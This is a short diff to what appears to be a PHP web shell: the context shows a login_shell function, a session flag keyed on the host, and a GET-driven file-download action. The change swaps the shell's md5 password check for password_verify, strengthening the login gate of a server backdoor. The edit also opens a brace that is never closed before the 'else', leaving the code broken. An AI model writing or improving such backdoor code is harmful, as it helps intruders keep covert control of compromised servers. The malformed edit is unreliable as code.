@@ -145,8 +145,8 @@ function login_shell() {
 exit;
 }
 if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
-if( empty($password) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $password) ) )
-	$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+if (empty($password) || (isset($_POST['pass']) && password_verify($_POST['pass'], $password))) {
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
 else
 login_shell();
 if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
